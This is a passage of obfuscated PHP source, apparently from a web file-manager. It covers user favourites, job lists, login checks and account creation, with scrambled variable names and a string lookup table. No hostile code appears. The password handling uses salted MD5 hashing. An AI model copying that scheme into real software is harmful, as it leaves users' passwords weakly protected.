$ÆËóç©î[1214]); break; } $¤Ç†Õèú = $í¨Ô“òÏ[$ÆËóç©î[86]]; if (!isset(self::$driverCache[$¤Ç†Õèú])) { $½æãæ·ª = strtolower($úãÕ¯Àú[$ÆËóç©î[97]]); $´‹ìåÅ« = $GLOBALS[$ÆËóç©î[6]][$ÆËóç©î[91]][$ÆËóç©î[855]]; $³‚àæÉ— = $ÆËóç©î[76] . (isset($´‹ìåÅ«[$½æãæ·ª]) ? $´‹ìåÅ«[$½æãæ·ª] : ucfirst($½æãæ·ª)); if (!class_exists($³‚àæÉ—)) { show_json("{$³‚àæÉ—}\x20\x6e\x6f\164\x20\x65\170\x69\x73\164\x73\x21", !1); } $ª°õôàç = isset($úãÕ¯Àú[$ÆËóç©î[6]]) ? $úãÕ¯Àú[$ÆËóç©î[6]] : !1; self::$driverCache[$¤Ç†Õèú] = new $³‚àæÉ—($ª°õôàç); } $íÁ›É¦ = self::$driverCache[$¤Ç†Õèú]; $íÁ›É¦->pathDriver = $Ÿ—´š„Ü; $íÁ›É¦->pathBase = $ÆËóç©î[12]; if (isset($úãÕ¯Àú[$ÆËóç©î[6]][$ÆËóç©î[1215]])) { $íÁ›É¦->pathBase = rtrim($úãÕ¯Àú[$ÆËóç©î[6]][$ÆËóç©î[1215]], $ÆËóç©î[8]) . $ÆËóç©î[8]; $¤ê¹ö› = $íÁ›É¦->pathBase . ltrim($¤ê¹ö›, $ÆËóç©î[8]); } $¤ê¹ö› = $íÁ›É¦->getPath($¤ê¹ö›); if (isset($í¨Ô“òÏ[$ÆËóç©î[1186]])) { $¤ê¹ö› = $í¨Ô“òÏ[$ÆËóç©î[1186]]; } $íÁ›É¦->path = $¤ê¹ö›; return $íÁ›É¦; } public static function errorTips($ª©İõŠ§ = false) { $ÓÄùõ‘³ =& $_SERVER[ ÇƒŠìÀ]; static $æŠÒÃÇ† = array(); $°Ø¯ªÅ° = 1000; if ($ª©İõŠ§ === -1) { return $æŠÒÃÇ† ? $æŠÒÃÇ†[count($æŠÒÃÇ†) - 1] : $ÓÄùõ‘³[12]; } if ($ª©İõŠ§ === !1) { return implode($ÓÄùõ‘³[248], $æŠÒÃÇ†); } if (count($æŠÒÃÇ†) >= $°Ø¯ªÅ°) { $æŠÒÃÇ† = array_slice($æŠÒÃÇ†, $°Ø¯ªÅ° * 0.5, $°Ø¯ªÅ°); } $æŠÒÃÇ†[] = $ª©İõŠ§; write_log($ÓÄùõ‘³[165] . ACTION . $ÓÄùõ‘³[1216] . $ª©İõŠ§, $ÓÄùõ‘³[1217]); } public static function getLastError($õÎ¥î¶ = '') { $öºŞŸÓ¬ = self::errorTips(-1); return $öºŞŸÓ¬ ? $öºŞŸÓ¬ : $õÎ¥î¶; } } goto BŒáäœù¾; C… –Ã¨Æª: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\141\x76"; protected function cacheFunctionAlias($ÎŒ¼àÍŒ) { $İóàÖ¾ğ =& $_SERVER[ ÇƒŠìÀ]; return array($İóàÖ¾ğ[1998] => array(USER_ID, $İóàÖ¾ğ[2339])); } protected function listData() { $ì¼¼š”€ =& $_SERVER[ ÇƒŠìÀ]; $´Ôï¨ïà = array($ì¼¼š”€[1680] => USER_ID, $ì¼¼š”€[528] => 0); $Û¬”¡± = $ì¼¼š”€[2340]; $ŞçüÂ†ö = $this->field($Û¬”¡±)->where($´Ôï¨ïà)->order($ì¼¼š”€[2341])->select(); return $ŞçüÂ†ö ? $ŞçüÂ†ö : array(); } protected function resetCache() { } protected function listView() { $øŒ¦ğ¬é =& $_SERVER[ ÇƒŠìÀ]; $Óšà’÷½ = $this->listData(); $¦ïÌ®×Ñ = array_filter_by_field($Óšà’÷½, $øŒ¦ğ¬é[33], $øŒ¦ğ¬é[460]); $Ãó„ºÍû = array_to_keyvalue($¦ïÌ®×Ñ, $øŒ¦ğ¬é[12], $øŒ¦ğ¬é[86]); if (!$Ãó„ºÍû) { return $Óšà’÷½; } $Ê¯ÓÊÇÈ = 2000; $¦ìğÊíÎ = array($øŒ¦ğ¬é[461] => array($øŒ¦ğ¬é[462], $Ãó„ºÍû)); $¯¸¼ØÕı = Model($øŒ¦ğ¬é[854])->listSource($¦ìğÊíÎ, $Ê¯ÓÊÇÈ); $¯¸¼ØÕı = array_merge($¯¸¼ØÕı[$øŒ¦ğ¬é[85]], $¯¸¼ØÕı[$øŒ¦ğ¬é[84]]); $¯¸¼ØÕı = array_to_keyvalue($¯¸¼ØÕı, $øŒ¦ğ¬é[183]); foreach ($Óšà’÷½ as $¯éêşùÏ => $·Öí±Úš) { $Ğû…ê‘Å = $¯¸¼ØÕı[$·Öí±Úš[$øŒ¦ğ¬é[86]]]; $Ğû…ê‘Å = $Ğû…ê‘Å ? $Ğû…ê‘Å : array(); $Óšà’÷½[$¯éêşùÏ] = array_merge($Ğû…ê‘Å, $·Öí±Úš); } return $Óšà’÷½; } protected function addFav($ïŞÁõƒÆ, $Îíè–Íè = '', $µË¥£ÔÓ = "\x73\157\165\x72\x63\x65") { $ªèìÒŒÖ =& $_SERVER[ ÇƒŠìÀ]; $ÆôôÂ§ = array($ªèìÒŒÖ[1680] => USER_ID, $ªèìÒŒÖ[528] => 0, $ªèìÒŒÖ[466] => $µË¥£ÔÓ, $ªèìÒŒÖ[465] => $ïŞÁõƒÆ); if ($this->where($ÆôôÂ§)->find()) { return !1; } $ÆôôÂ§ = array($ªèìÒŒÖ[1680] => USER_ID, $ªèìÒŒÖ[528] => 0); $è’ ’÷ = $this->where($ÆôôÂ§)->max($ªèìÒŒÖ[1911]); if (!$è’ ’÷) { $è’ ’÷ = 0; } if (!$Îíè–Íè && $µË¥£ÔÓ == $ªèìÒŒÖ[460]) { $ÒÛÜ™æ¨ = Model($ªèìÒŒÖ[1368])->where(array($ªèìÒŒÖ[461] => $ïŞÁõƒÆ))->find(); if (!$ÒÛÜ™æ¨) { return !1; } $Îíè–Íè = $ÒÛÜ™æ¨[$ªèìÒŒÖ[32]]; } $Îíè–Íè = $this->getAutoName($Îíè–Íè); $£´çâÛí = array($ªèìÒŒÖ[1680] => USER_ID, $ªèìÒŒÖ[528] => 0, $ªèìÒŒÖ[464] => $Îíè–Íè, $ªèìÒŒÖ[465] => $ïŞÁõƒÆ, $ªèìÒŒÖ[466] => $µË¥£ÔÓ, $ªèìÒŒÖ[1891] => $è’ ’÷ + 1); return $this->add($£´çâÛí); } protected function remove($İ¾¼ÛáÕ) { $è«Ë—¼ç =& $_SERVER[ ÇƒŠìÀ]; $ê¿»„…² = array($è«Ë—¼ç[1680] => USER_ID, $è«Ë—¼ç[463] => $İ¾¼ÛáÕ); return $this->where($ê¿»„…²)->delete(); } protected function removeByName($¡ì›¥“ô) { $œ½Ü—ƒ =& $_SERVER[ ÇƒŠìÀ]; $óäÈ€€Ë = array($œ½Ü—ƒ[1680] => USER_ID, $œ½Ü—ƒ[464] => $¡ì›¥“ô, $œ½Ü—ƒ[528] => 0); return $this->where($óäÈ€€Ë)->delete(); } protected function rename($æØ¸Ã‚, $ùáÓ¬ñ®) { $È¬”À¢ =& $_SERVER[ ÇƒŠìÀ]; if ($æØ¸Ã‚ == $ùáÓ¬ñ®) { return !1; } $§ìˆœÌ¶ = $this->getAutoName($ùáÓ¬ñ®); if ($ùáÓ¬ñ® != $§ìˆœÌ¶) { return !1; } $“±øîê = array($È¬”À¢[1680] => USER_ID, $È¬”À¢[528] => 0, $È¬”À¢[32] => $æØ¸Ã‚); return $this->where($“±øîê)->save(array($È¬”À¢[32] => $ùáÓ¬ñ®)); } protected function resetSort($¨…³õ ×) { $„âØÃ‰ =& $_SERVER[ ÇƒŠìÀ]; $¨…³õ × = is_array($¨…³õ ×) ? $¨…³õ × : array(); $Á½Õ¶€Ä = array($„âØÃ‰[1680] => USER_ID); for ($Ú§‡éÚ = 0; $Ú§‡éÚ < count($¨…³õ ×); $Ú§‡éÚ++) { $Á½Õ¶€Ä[$„âØÃ‰[463]] = $¨…³õ ×[$Ú§‡éÚ]; $this->where($Á½Õ¶€Ä)->save(array($„âØÃ‰[1891] => $Ú§‡éÚ + 1)); } return !0; } protected function moveTop($ëÏÈê) { $ˆï†¨‚ =& $_SERVER[ ÇƒŠìÀ]; $ı‡Ì®îà = array($ˆï†¨‚[1680] => USER_ID, $ˆï†¨‚[528] => 0); $‚«ø¶ŸÍ = $this->where($ı‡Ì®îà)->where(array($ˆï†¨‚[32] => $ëÏÈê))->find(); if (!$‚«ø¶ŸÍ) { return; } $æş³©Ù« = $this->field($ˆï†¨‚[445])->where($ı‡Ì®îà)->order($ˆï†¨‚[2341])->select(); $æş³©Ù« = array_to_keyvalue($æş³©Ù«, $ˆï†¨‚[12], $ˆï†¨‚[445]); $ºÇ³‘À´ = $æş³©Ù«; $æş³©Ù« = array_remove_value($æş³©Ù«, $‚«ø¶ŸÍ[$ˆï†¨‚[445]]); array_unshift($æş³©Ù«, $‚«ø¶ŸÍ[$ˆï†¨‚[445]]); return $this->resetSort($æş³©Ù«); } protected function moveBottom($àÉÁòìÕ) { $ÒëœÈ‚ =& $_SERVER[ ÇƒŠìÀ]; $ö¥ÃÎ–† = array($ÒëœÈ‚[1680] => USER_ID, $ÒëœÈ‚[528] => 0); $ÂÍ ä¦ª = $this->where($ö¥ÃÎ–†)->max($ÒëœÈ‚[1911]); $ŸÓ›å×Î = array($ÒëœÈ‚[1911] => $ÂÍ ä¦ª + 1); return $this->where($ö¥ÃÎ–†)->where(array($ÒëœÈ‚[32] => $àÉÁòìÕ))->save($ŸÓ›å×Î); } private function getAutoName($¬ó©§ä) { $‰Î‚í† =& $_SERVER[ ÇƒŠìÀ]; $Œ…’Ş = array($‰Î‚í†[1680] => USER_ID, $‰Î‚í†[528] => 0); $ä‡Ã‘Š¬ = $this->field($‰Î‚í†[32])->where($Œ…’Ş)->select(); $ä‡Ã‘Š¬ = array_to_keyvalue($ä‡Ã‘Š¬, $‰Î‚í†[12], $‰Î‚í†[32]); if (!$ä‡Ã‘Š¬ || !in_array($¬ó©§ä, $ä‡Ã‘Š¬)) { return $¬ó©§ä; } for ($€–Ò¿Ò = 0; $€–Ò¿Ò < count($ä‡Ã‘Š¬); $€–Ò¿Ò++) { if (!in_array($¬ó©§ä . "\50{$€–Ò¿Ò}\x29", $ä‡Ã‘Š¬)) { return $¬ó©§ä . "\x28{$€–Ò¿Ò}\51"; } } return $¬ó©§ä . "\x28{$€–Ò¿Ò}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\152\157\x62\114\151\x73\x74"; public $field = array("\x6e\141\155\145", "\144\x65\163\143", "\163\x6f\162\x74"); const JOB_KEY = "\x73\145\154\146\112\157\142\114\x69\163\x74"; public function listData($’îñºÇ† = false, $æĞè‘Ä§ = "\x73\x6f\x72\164", $ÆÊ–·‘ = false) { return parent::listData($’îñºÇ†, $æĞè‘Ä§, $ÆÊ–·‘); } public function remove($äİõÕëÓ) { return parent::remove($äİõÕëÓ); } public function add($ù–×òƒ³) { $Ş¸­ÕÖÁ =& $_SERVER[ ÇƒŠìÀ]; if ($this->findByName($ù–×òƒ³[$Ş¸­ÕÖÁ[32]])) { return !1; } $ù–×òƒ³[$Ş¸­ÕÖÁ[1911]] = $this->getSort(); return parent::insert($ù–×òƒ³); } private function getSort() { $¨®Ğû =& $_SERVER[ ÇƒŠìÀ]; $…ˆœƒ¥Ë = parent::listData(); $ÅãŠÕöÉ = array_to_keyvalue($…ˆœƒ¥Ë, $¨®Ğû[12], $¨®Ğû[1911]); return empty($ÅãŠÕöÉ) ? 0 : max($ÅãŠÕöÉ) + 1; } public function update($ì’Ò¬€È, $öèÚî¤’) { $µï™€æú =& $_SERVER[ ÇƒŠìÀ]; $ÜëŠ¹Ê‰ = parent::listData($ì’Ò¬€È); $Ü‚¿éå¥ = $this->findByName($öèÚî¤’[$µï™€æú[32]]); if (!$ÜëŠ¹Ê‰ || $Ü‚¿éå¥ && $Ü‚¿éå¥[$µï™€æú[445]] != $ÜëŠ¹Ê‰[$µï™€æú[445]]) { return !1; } return parent::update($ì’Ò¬€È, $öèÚî¤’); } public function setUserJob($ò®‰Åé, $‚Åèëµ”) { $çâ……É =& $_SERVER[ ÇƒŠìÀ]; if (!is_array($‚Åèëµ”)) { $‚Åèëµ” = array($‚Åèëµ”); } $úñÌ­¤§ = parent::listData(); $ûš¬ËÁÎ = array_to_keyvalue($úñÌ­¤§, $çâ……É[32]); $‘ÅÁïÄø = $çâ……É[424]; foreach ($‚Åèëµ” as $ç«Üåœ) { if ($ûš¬ËÁÎ[$ç«Üåœ]) { $‘ÅÁïÄø .= $ûš¬ËÁÎ[$ç«Üåœ][$çâ……É[445]] . $çâ……É[50]; } else { $òÃÊ§ö¬ = $this->add($ç«Üåœ); $‘ÅÁïÄø .= $òÃÊ§ö¬ . $çâ……É[50]; } } $‘ÅÁïÄø = rtrim($‘ÅÁïÄø, $çâ……É[50]); Model($çâ……É[569])->metaSet($ò®‰Åé, self::JOB_KEY, $‘ÅÁïÄø); } public function getUserJob($¬åÇ‘Ô¼) { $ÀÄ¸ÖËş = Model($_SERVER[ ÇƒŠìÀ][569])->metaGet($¬åÇ‘Ô¼); return $this->getUserJobInfo($ÀÄ¸ÖËş[self::JOB_KEY]); } public function getUserJobInfo($‘´Å˜ÄÁ) { $ÆõÛ·®ø =& $_SERVER[ ÇƒŠìÀ]; $Ì¿ˆÒôÛ = explode($ÆõÛ·®ø[50], $‘´Å˜ÄÁ); $´‘Ó‹¾× = parent::listData(); $´‘Ó‹¾× = array_remove_key($´‘Ó‹¾×, $ÆõÛ·®ø[217]); $é£Ì´ü = array(); foreach ($Ì¿ˆÒôÛ as $õÅ¹Ø¹È) { if (isset($´‘Ó‹¾×[$õÅ¹Ø¹È])) { $é£Ì´ü[] = $´‘Ó‹¾×[$õÅ¹Ø¹È]; } } return $é£Ì´ü; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\x6d\x65" => "\x75\x73\145\162\137\155\145\x74\x61", "\x6d\x65\164\141\106\x69\x65\154\x64" => "\x75\x73\145\162\111\104"); protected $simpleField = "\x75\x73\145\x72\x49\104\54\x6e\151\x63\153\116\x61\155\x65\x2c\x6e\x61\x6d\x65\54\141\x76\x61\x74\x61\x72\x2c\x73\x65\170\54\163\164\x61\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¸Ç‡ñ´ ) { $‡¯æû› =& $_SERVER[ ÇƒŠìÀ]; $ğÌ¼æ¬Ç = $‡¯æû›[2342]; return array($‡¯æû›[1965] => array($¸Ç‡ñ´ [0], $ğÌ¼æ¬Ç), $‡¯æû›[1967] => array($¸Ç‡ñ´ [0], $ğÌ¼æ¬Ç), $‡¯æû›[2343] => array($¸Ç‡ñ´ [0], $ğÌ¼æ¬Ç)); } protected function getInfo($ï¤œ†¾, $»çãá×¼ = false) { $™ìÓ´ƒĞ = $this->getInfoSimple($ï¤œ†¾); if (!is_array($™ìÓ´ƒĞ)) { return array(); } if ($»çãá×¼) { return $this->_getInfoApply($™ìÓ´ƒĞ); } return $this->cacheFunctionGet($_SERVER[ ÇƒŠìÀ][1969], $ï¤œ†¾); } protected function getInfoFull($ÈŞ·ïğ·, $Ö¥´œÄŠ = false) { $ÂëÙèØ’ = $this->getInfoSimple($ÈŞ·ïğ·); if (!is_array($ÂëÙèØ’)) { return array(); } if ($Ö¥´œÄŠ) { return $this->_getInfoApply($ÂëÙèØ’, !0); } return $this->cacheFunctionGet($_SERVER[ ÇƒŠìÀ][2344], $ÈŞ·ïğ·); } private function _getInfoApply($óµÓ•‡İ, $óÑ³…£‘ = false) { $¸©ÜÃôî =& $_SERVER[ ÇƒŠìÀ]; if (!$óµÓ•‡İ) { return $óµÓ•‡İ; } $ÆŠÜÚæà = md5($¸©ÜÃôî[2345] . $óµÓ•‡İ[$¸©ÜÃôî[922]] . $¸©ÜÃôî[2346] . $óµÓ•‡İ[$¸©ÜÃôî[32]]); $óµÓ•‡İ = $this->_listDataApplyItem($óµÓ•‡İ); $–‹êğ„† = Model($¸©ÜÃôî[1368])->metaGet($óµÓ•‡İ[$¸©ÜÃôî[89]][$¸©ÜÃôî[183]]); $óµÓ•‡İ[$¸©ÜÃôî[2347]] = $ÆŠÜÚæà; $óµÓ•‡İ[$¸©ÜÃôî[89]][$¸©ÜÃôî[2162]] = isset($–‹êğ„†[$¸©ÜÃôî[2163]]) ? $–‹êğ„†[$¸©ÜÃôî[2163]] : null; if ($óÑ³…£‘) { $óµÓ•‡İ[$¸©ÜÃôî[509]] = $this->metaGet($óµÓ•‡İ[$¸©ÜÃôî[1689]]); } return $óµÓ•‡İ; } protected function getInfoSimple($ØÔÓÙüé, $³ÑÔ´–¦ = false) { $ÁÔçúÏÔ =& $_SERVER[ ÇƒŠìÀ]; if (!$ØÔÓÙüé) { return array(); } if ($³ÑÔ´–¦) { $Ê§íÅ¡ô = $this->where(array($ÁÔçúÏÔ[1689] => intval($ØÔÓÙüé)))->find(); if (!is_array($Ê§íÅ¡ô)) { return array(); } $Ê§íÅ¡ô[$ÁÔçúÏÔ[2348]] = Action($ÁÔçúÏÔ[2349])->parseUrl($Ê§íÅ¡ô[$ÁÔçúÏÔ[2348]]); return $Ê§íÅ¡ô; } return $this->cacheFunctionGet($ÁÔçúÏÔ[1970], $ØÔÓÙüé); } protected function getInfoSimpleOuter($×Ò±‡½³) { $±àÛËĞ± =& $_SERVER[ ÇƒŠìÀ]; if (!$×Ò±‡½³ || $×Ò±‡½³ == 0) { return array($±àÛËĞ±[1689] => $±àÛËĞ±[214], $±àÛËĞ±[32] => $±àÛËĞ±[165] . LNG($±àÛËĞ±[2350]) . $±àÛËĞ±[167], $±àÛËĞ±[2348] => STATIC_PATH . $±àÛËĞ±[2351]); } $Ú”ñßôì = $this->cacheFunctionGet($±àÛËĞ±[1970], $×Ò±‡½³); $¤½ÖÌ˜ = array_field_key($Ú”ñßôì, explode($±àÛËĞ±[50], $this->simpleField)); if (!$¤½ÖÌ˜) { return array($±àÛËĞ±[1689] => $±àÛËĞ±[1223], $±àÛËĞ±[32] => $±àÛËĞ±[165] . LNG($±àÛËĞ±[2352]) . $±àÛËĞ±[167], $±àÛËĞ±[2348] => STATIC_PATH . $±àÛËĞ±[2353]); } $¤½ÖÌ˜[$±àÛËĞ±[2348]] = Action($±àÛËĞ±[2349])->parseUrl($¤½ÖÌ˜[$±àÛËĞ±[2348]]); return $¤½ÖÌ˜; } protected function groupUser($¯¦Ç¯¾¯) { } public static function errorLang($Ó€÷ï) { $ö³ßÃ´Ø =& $_SERVER[ ÇƒŠìÀ]; $À»ØğÙ¦ = array(self::ERROR_USER_NOT_EXISTS => $ö³ßÃ´Ø[2354], self::ERROR_USER_PASSWORD_ERROR => $ö³ßÃ´Ø[2355], self::ERROR_USER_EXIST_NAME => $ö³ßÃ´Ø[2356], self::ERROR_USER_EXIST_PHONE => $ö³ßÃ´Ø[2357], self::ERROR_USER_EXIST_EMAIL => $ö³ßÃ´Ø[2358], self::ERROR_USER_LOGIN_LOCK => $ö³ßÃ´Ø[2359], self::ERROR_IP_NOT_ALLOW => $ö³ßÃ´Ø[2360], self::ERROR_USER_EXIST_NICKNAME => $ö³ßÃ´Ø[2361]); return LNG($À»ØğÙ¦[$Ó€÷ï]); } public function getInfoByMeta($¨ªâîµÛ, $€ö¸‰†æ) { $ ¼Ÿë”¬ =& $_SERVER[ ÇƒŠìÀ]; $»“”ûÅ‘ = Model($ ¼Ÿë”¬[2362])->where(array($ ¼Ÿë”¬[96] => $¨ªâîµÛ, $ ¼Ÿë”¬[420] => $€ö¸‰†æ))->find(); if ($»“”ûÅ‘) { return $this->getInfo($»“”ûÅ‘[$ ¼Ÿë”¬[1689]]); } return !1; } public function userLoginCheck($»…˜ÍÆ², $åµ·ãÊ«) { $”ÁÁÀÕ =& $_SERVER[ ÇƒŠìÀ]; $í¦êÇ¯° = $this->userLoginFind($»…˜ÍÆ²); if (!$í¦êÇ¯°) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($í¦êÇ¯°[$”ÁÁÀÕ[1689]], $åµ·ãÊ«)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($í¦êÇ¯°[$”ÁÁÀÕ[1689]]); } public function userLoginFind($ü¸ä¥öÈ) { $ÀßŒ€â =& $_SERVER[ ÇƒŠìÀ]; $­¯€ğ¤² = array($ÀßŒ€â[32] => $ü¸ä¥öÈ, $ÀßŒ€â[2170] => $ü¸ä¥öÈ, $ÀßŒ€â[351] => $ü¸ä¥öÈ, $ÀßŒ€â[2363] => $ü¸ä¥öÈ, $ÀßŒ€â[1035] => $ÀßŒ€â[1037]); if ($this->nickNameRpt()) { unset($­¯€ğ¤²[$ÀßŒ€â[2170]]); } return $this->where($­¯€ğ¤²)->find(); } public function clearCache($„¶ë˜ùØ) { $É²ŒÚ¿Œ =& $_SERVER[ ÇƒŠìÀ]; $this->cacheFunctionClear($É²ŒÚ¿Œ[1969], $„¶ë˜ùØ); $this->cacheFunctionClear($É²ŒÚ¿Œ[1970], $„¶ë˜ùØ); $this->cacheFunctionClear($É²ŒÚ¿Œ[2344], $„¶ë˜ùØ); } public function userPasswordCheck($‰áœì¼Å, $Í¾ú§ıõ) { $îŠê×ĞÃ =& $_SERVER[ ÇƒŠìÀ]; $˜Ì¡¦ŞÉ = $this->where(array($îŠê×ĞÃ[1689] => intval($‰áœì¼Å)))->find(); $¤åªæ¼ù = $this->metaGet($‰áœì¼Å); $İ÷€ Î = isset($¤åªæ¼ù[$îŠê×ĞÃ[2364]]) ? $¤åªæ¼ù[$îŠê×ĞÃ[2364]] : $îŠê×ĞÃ[12]; if (md5($İ÷€ Î . trim($Í¾ú§ıõ)) !== $˜Ì¡¦ŞÉ[$îŠê×ĞÃ[922]]) { return !1; } return !0; } public function userAdd($¢ù—üÁ£) { $æÅ„©Ç› =& $_SERVER[ ÇƒŠìÀ]; $Á·¢½ˆ® = array($æÅ„©Ç›[464] => $¢ù—üÁ£[$æÅ„©Ç›[32]], $æÅ„©Ç›[2365] => $¢ù—üÁ£[$æÅ„©Ç›[2089]], $æÅ„©Ç›[2366] => isset($¢ù—üÁ£[$æÅ„©Ç›[351]]) ? $¢ù—üÁ£[$æÅ„©Ç›[351]] : $æÅ„©Ç›[12], $æÅ„©Ç›[2367] => isset($¢ù—üÁ£[$æÅ„©Ç›[2363]]) ? $¢ù—üÁ£[$æÅ„©Ç›[2363]] : $æÅ„©Ç›[12], $æÅ„©Ç›[2368] => isset($¢ù—üÁ£[$æÅ„©Ç›[2170]]) ? $¢ù—üÁ£[$æÅ„©Ç›[2170]] : $¢ù—üÁ£[$æÅ„©Ç›[32]], $æÅ„©Ç›[2369] => isset($¢ù—üÁ£[$æÅ„©Ç›[2348]]) ? $¢ù—üÁ£[$æÅ„©Ç›[2348]] : $æÅ„©Ç›[12], $æÅ„©Ç›[2370] => isset($¢ù—üÁ£[$æÅ„©Ç›[2371]]) ? $¢ù—üÁ£[$æÅ„©Ç›[2371]] : 1, $æÅ„©Ç›[2372] => $¢ù—üÁ£[$æÅ„©Ç›[922]], $æÅ„©Ç›[1971] => isset($¢ù—üÁ£[$æÅ„©Ç›[1874]]) ? $¢ù—üÁ£[$æÅ„©Ç›[1874]] : 1024 * 1024 * 20, $æÅ„©Ç›[1972] => 0, $æÅ„©Ç›[2373] => 0, $æÅ„©Ç›[2016] => isset($¢ù—üÁ£[$æÅ„©Ç›[779]]) ? $¢ù—üÁ£[$æÅ„©Ç›[779]] : 1); if (!empty($¢ù—üÁ£[$æÅ„©Ç›[1689]])) { $Á·¢½ˆ®[$æÅ„©Ç›[1689]] = $¢ù—üÁ£[$æÅ„©Ç›[1689]]; } $ö‹™×ı¾ = $this->_checkExist($¢ù—üÁ£); if ($ö‹™×ı¾ !== !0) { return $ö‹™×ı¾; } if (!empty($Á·¢½ˆ®[$æÅ„©Ç›[2348]]) && strlen($Á·¢½ˆ®[$æÅ„©Ç›[2348]]) > 255) { $Á·¢½ˆ®[$æÅ„©Ç›[2348]] = $æÅ„©Ç›[12]; } $ùÕüŠÀÙ = $this->add($Á·¢½ˆ®); $¸áª˜ÈÊ = array($æÅ„©Ç›[2372] => $Á·¢½ˆ®[$æÅ„©Ç›[922]], $æÅ„©Ç›[2368] => $Á·¢½ˆ®[$æÅ„©Ç›[2170]]); $this->userEdit($ùÕüŠÀÙ, $¸áª˜ÈÊ); Model($æÅ„©Ç›[1368])->userRootAdd($ùÕüŠÀÙ); return $ùÕüŠÀÙ; } protected function userEditTest($øğ¦ä¬Ö, $ÚÁÙ¬§ß) { return $this->call($_SERVER[ ÇƒŠìÀ][2374], $øğ¦ä¬Ö, $ÚÁÙ¬§ß); } protected function userEdit($áƒßÎ, $ì›şÅ«¬) { $¸™ÏŠÁ =& $_SERVER[ ÇƒŠìÀ]; $óîŒ÷Ÿ· = $this->getInfoSimple($áƒßÎ); if (!$óîŒ÷Ÿ·) { return !1; } $“¬¦ÇªŸ = $this->_checkExist($ì›şÅ«¬, $áƒßÎ); if ($“¬¦ÇªŸ !== !0) { return $“¬¦ÇªŸ; } if (isset($ì›şÅ«¬[$¸™ÏŠÁ[922]]) && trim($ì›şÅ«¬[$¸™ÏŠÁ[922]]) != $¸™ÏŠÁ[12]) { $´íß³ö± = $this->metaGet($áƒßÎ); if (empty($´íß³ö±[$¸™ÏŠÁ[2364]])) { $´íß³ö±[$¸™ÏŠÁ[2364]] = rand_string(10); Model($¸™ÏŠÁ[548])->metaSet($áƒßÎ, $¸™ÏŠÁ[2364], $´íß³ö±[$¸™ÏŠÁ[2364]]); } $ì›şÅ«¬[$¸™ÏŠÁ[922]] = md5($´íß³ö±[$¸™ÏŠÁ[2364]] . trim($ì›şÅ«¬[$¸™ÏŠÁ[922]])); } else { unset($ì›şÅ«¬[$¸™ÏŠÁ[922]]); } if (!empty($ì›şÅ«¬[$¸™ÏŠÁ[2348]]) && strlen($ì›şÅ«¬[$¸™ÏŠÁ[2348]]) > 255) { $ì›şÅ«¬[$¸™ÏŠÁ[2348]] = $¸™ÏŠÁ[12]; } $this->where(array($¸™ÏŠÁ[1680] => $áƒßÎ))->save($ì›şÅ«¬); if (isset($ì›şÅ«¬[$¸™ÏŠÁ[2170]])) { $this->setNamePinyin($áƒßÎ, $ì›şÅ«¬[$¸™ÏŠÁ[2170]]); } $this->clearCache($áƒßÎ); return !0; } public function setNamePinyin($Ì²ç‰©Û, $˜¨ñÀ±Ê = false) { $ö¬œî¨» =& $_SERVER[ ÇƒŠìÀ]; if (!$˜¨ñÀ±Ê) { $õËÃ÷¿œ = $this->getInfoSimple($Ì²ç‰©Û); $˜¨ñÀ±Ê = $õËÃ÷¿œ[$ö¬œî¨»[2170]] ? $õËÃ÷¿œ[$ö¬œî¨»[2170]] : $õËÃ÷¿œ[$ö¬œî¨»[32]]; } $äñ¹ŸÍÃ = Model($ö¬œî¨»[569]); if (!Input::check($˜¨ñÀ±Ê, $ö¬œî¨»[625])) { return $äñ¹ŸÍÃ->metaSet($Ì²ç‰©Û, array($ö¬œî¨»[508] => $ö¬œî¨»[12], $ö¬œî¨»[507] => $ö¬œî¨»[12])); } return $äñ¹ŸÍÃ->metaSet($Ì²ç‰©Û, array($ö¬œî¨»[508] => str_replace($ö¬œî¨»[53], $ö¬œî¨»[12], Pinyin::get($˜¨ñÀ±Ê)), $ö¬œî¨»[507] => Pinyin::get($˜¨ñÀ±Ê, $ö¬œî¨»[626]))); } private function nickNameRpt() { $íŠÃúµ— =& $_SERVER[ ÇƒŠìÀ]; $ÓßÍÂ×Â = Model($íŠÃúµ—[799])->get($íŠÃúµ—[2375]); $Œ³ŸÉ´ë = $GLOBALS[$íŠÃúµ—[6]][$íŠÃúµ—[427]][$íŠÃúµ—[2375]]; $‡À¼ßàÓ = !is_null($ÓßÍÂ×Â) ? $ÓßÍÂ×Â : $Œ³ŸÉ´ë; return !!$‡À¼ßàÓ; } private function _checkExist($£·Ø¢“è, $Ó­”§áÓ = false) { $Â€¹…ƒ° =& $_SERVER[ ÇƒŠìÀ]; $Ğ¾ßşÂÏ = array($Â€¹…ƒ°[32] => UserModel::ERROR_USER_EXIST_NAME, $Â€¹…ƒ°[2170] => UserModel::ERROR_USER_EXIST_NICKNAME, $Â€¹…ƒ°[351] => UserModel::ERROR_USER_EXIST_EMAIL, $Â€¹…ƒ°[2363] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ğ¾ßşÂÏ[$Â€¹…ƒ°[2170]]); } $ìúÈ›¥³ = $Ó­”§áÓ ? array($Â€¹…ƒ°[1689] => array($Â€¹…ƒ°[2376], $Ó­”§áÓ)) : array(); foreach ($Ğ¾ßşÂÏ as $ë—´ïÔ => $íøÇ¿´) { $®İÕ›÷ = array(); foreach ($Ğ¾ßşÂÏ as $ÜäÇÑ‘µ => $úîÆÈì) { if (isset($£·Ø¢“è[$ÜäÇÑ‘µ]) && $£·Ø¢“è[$ÜäÇÑ‘µ]) { $®İÕ›÷[] = $£·Ø¢“è[$ÜäÇÑ‘µ]; } } if (!$®İÕ›÷) { continue; } $‰îÎàª = array_merge(array($ë—´ïÔ => array($Â€¹…ƒ°[7], $®İÕ›÷)), 